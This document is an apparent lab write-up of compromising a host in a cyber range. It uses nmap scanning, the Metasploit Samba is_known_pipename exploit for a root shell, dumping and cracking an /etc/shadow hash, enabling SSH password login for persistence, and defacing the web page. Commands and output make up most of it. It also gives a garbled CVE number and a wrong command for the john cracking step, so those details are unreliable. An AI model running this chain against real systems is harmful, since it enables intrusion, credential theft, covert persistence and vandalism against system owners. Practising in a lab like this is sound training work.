Objective: Obtain root access to a vulnerable computer on the network and have some fun with it.

### Get your ip and netmask

To scan our network we need our ip and netmask. Open up a terminal and run `ifconfig` 

Here's part of my output for example:
`inet 10.1.121.162 netmask 255.255.240.0 `

Look up what your netmask is in CIDR notation.
### Use nmap to discover computers on the network
```
nmap -sn 10.1.121.162/20
```
Returns the output 
```
Nmap scan report for ip-10-1-114-133.ec2.internal (10.1.114.133)
Host is up (0.00077s latency).
Nmap scan report for ip-10-1-121-162.ec2.internal (10.1.121.162)
Host is up (0.00028s latency).
Nmap scan report for ip-10-1-122-225.ec2.internal (10.1.122.225)
Host is up (0.0011s latency).
Nmap scan report for ip-10-1-126-201.ec2.internal (10.1.126.201)
Host is up (0.00097s latency).
Nmap done: 4096 IP addresses (4 hosts up) scanned in 107.04 seconds
```
Now let's check each ip to get more info
```
nmap -v 10.1.114.133 10.1.121.162 10.1.122.225 10.1.126.201
```
#### Scan  Ip for port details

IP `10.1.114.133` catches my eye (for no other reason except that it had the most ports open). 
```
Nmap scan report for ip-10-1-114-133.ec2.internal (10.1.114.133)
Host is up (0.00027s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

Let's get more details about this device using
```
nmap -v -A -p22,80,139,445 10.1.114.133
```
`-A` for OS detection.
I specified the open ports with `-p` to speed up the scan

Output:
```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c5:65:89:9d:a5:f8:23:7f:26:76:72:36:49:04:b7:0f (RSA)
|   256 7f:03:b3:02:35:6d:f6:3b:d8:c8:8d:a9:38:2a:de:6d (ECDSA)
|_  256 64:c2:a6:25:e7:05:28:f1:14:83:7e:b2:02:fd:67:a4 (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)
445/tcp open  3.X - 4.X   Samba smbd 4.6.0 (workgroup: MYGROUP)
Service Info: Host: SMB; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1s, deviation: 1s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.6.0)
|   Computer name: smb
|   NetBIOS computer name: SMB\x00
|   Domain name: example.com.v3-d7cfe5fd-6a9e-4897-b554-d042744f666d.us-east-1.cyberrange.internal
|   FQDN: smb.example.com.v3-d7cfe5fd-6a9e-4897-b554-d042744f666d.us-east-1.cyberrange.internal
|_  System time: 2024-02-08T18:43:43+00:00
| smb2-time: 
|   date: 2024-02-08T18:43:41
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

### Check for vulnerabilities
Let's google the Samba version and see if there are any known exploits.
There's a vulnerability `CVE-2017-794` and we're in luck because of target's Samba version is vulnerable to this exploit.
[This medium article](https://medium.com/@lucideus/sambacry-rce-exploit-lucideus-research-3a3e5bd9e17c) goes into more detail about the exploit and a step by step process on how to gain shell access to the vulnerable machine. 

### Time for some hacking
Go back into the terminal and type `msfconsole` to start metasploit.
Once the metasploit console starts we need to load the exploit
```
use exploit/linux/samba/is_known_pipename
```
Now set the Remote host to the ip of the machine we just scanned
```
set RHOST 10.1.114.133
```
Type `exploit` and the exploit runs and opens a shell to the machine

Here's the output when I ran the exploit
```
[*] 10.1.114.133:445 - Using location \\10.1.114.133\sharedFolder\ for the path
[*] 10.1.114.133:445 - Retrieving the remote path of the share 'sharedFolder'
[*] 10.1.114.133:445 - Share 'sharedFolder' has server-side path '/srv/sharedFolder
[*] 10.1.114.133:445 - Uploaded payload to \\10.1.114.133\sharedFolder\wDqsXtzQ.so
[*] 10.1.114.133:445 - Loading the payload from server-side path /srv/sharedFolder/wDqsXtzQ.so using \\PIPE\/srv/sharedFolder/wDqsXtzQ.so...
[-] 10.1.114.133:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 10.1.114.133:445 - Loading the payload from server-side path /srv/sharedFolder/wDqsXtzQ.so using /srv/sharedFolder/wDqsXtzQ.so...
[+] 10.1.114.133:445 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 1 opened (10.1.121.162:46143 -> 10.1.114.133:445) at 2024-02-08 18:58:58 +0000
```
Just to verify type
`hostname -i` to see the ip of the machine and `whoami` to see what user you are.
```
hostname -i
10.1.114.133
whoami
root
```
Nice! We have root access.
### ssh
If you check back at the nmap output you'll see that ssh is also open. It would be fun come back to the machine whenever we wanted. Before we can ssh we need a couple more bits of info: the username of someone who has sudo access, and their password. The user groups are stored in the file `/etc/group` 

Use grep to filter out searching for groups like admin or sudo or su
```
cat /etc/group | grep -E "sudo|admin|su"
```
The -E flag takes each phrase we want to filter by separated with | 
```
cat /etc/group | grep -E "sudo|admin|su"

sudo:x:27:student
admin:x:117:
```
It seems like  the user student is in the group sudo. Now let's get that user's password hash and see if we can rip their password out.

Filter out the /etc/shadow file by the user we want.
```
cat /etc/shadow | grep student
```

We are given the password `student:$6$ey.lTke5u7fWxsFj$OMSVjHL1NL7kFyTxegHTGF9/oxsToX5h3PnBz0kp9qqQPS9CyT4lihohdEDlYovm.hxnekrPmlPf/.1MJ6TI/0:19741:0:99999:7:::`

Copy the hash to your clipboard and open a new terminal on your machine.

Save the hash to a .txt file to make the john command look prettier. Make sure to use single quotes with echo or the hash will not save property 
```
echo '<password hash>' >> shash.txt
```
Now let's use john to rip it.
```
echo '<password hash>' >> shash.txt
```
We see that the password is just student!

Now let's try and ssh into the machine. 
```
ssh student@10.1.114.133
```
We get hit with a `permission denied (publickey)` hmmm. Let's check the ssh config file and see if it's set up properly. Go back to the terminal that has a shell to the vulnerable machine and type
```
cat /etc/ssh/sshd_config
```

`sshd_config` is the file for server side configuration. It might help us figure out our problem.

Here's an output of the beginning of the file:
```
# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

Include /etc/ssh/sshd_config.d/*.conf

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
#PermitRootLogin prohibit-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

#PubkeyAuthentication yes

```

 We notice that  most of the configurations commented out with #. `#PubkeyAuthentication yes` seems like it could be a configuration we need to ssh and it could be the source of our `Permission denied (publickey)` error.  
 
  The line `Include /etc/ssh/sshd_config.d/*.conf` is using configurations from another file and that could give us more info into the machine's ssh configuration. Cd into the /etc/ssh/sshd_config.d directory and see what config files are listed
 ```
 cd /etc/ssh/sshd_config.d
 ls
 ```
 There is one file named `50-cloud-init.conf`. Displaying the contents of that files shows us:
```
#PasswordAuthentication no
```

That won't work for us. Let's add `PasswordAuthentication yes` to a newline in the file and see what happens
```
echo "PasswordAuthentication yes" >> 50-cloud-init.conf
```
Notice we used two `>'s` to append a file with echo. If we only used one `>` it would have overwritten the entire file. 

You can cat the file to double check your changes.

We need to restart ssh so our changes can update.
```
systemctl restart ssh
```

Now go to the other terminal and try to ssh again. Enter the password "student" and boom you're logged in. At this point you can ^C in the metasploit shell and type `exit` to close out of metasploit.
### Having some more fun
Let's check out the computer's website and see what it's about. Opening firefox and type  `10.1.114.133` in the address bar. We are greeted with a basic Index of / site with a couple files. The site files are stored in `var/www/html`. Often times the /var/www/html directory can only be changed by root. Cd into the html directory and entro super user mode with 
```
sudo su
```
Since the website is just an index of site there probably isn't a landing page for the server to load. Let's create an index.html file so next time someone goes tot he server they are greeted by our message.  
```
<!DOCTYPE html>
<body>
	<p>You got hacked</p>
</body>
</html>
```
in the html/ directory make an index.html file (here's something pretty simple). Save the file and reload the website. If nothing changes try and accessing the site from a private tab because firefox might have saved the site in a cache.

### Conclusion
With ssh you can do pretty much whatever you want whenever you want. Just note the device does log your comings and goings. While you are ssh'd in type
```
sudo grep 'sshd.*Accepted' /var/log/auth.log
```
You will see a log of all the time's you have ssh'd into the device along with your ip address!
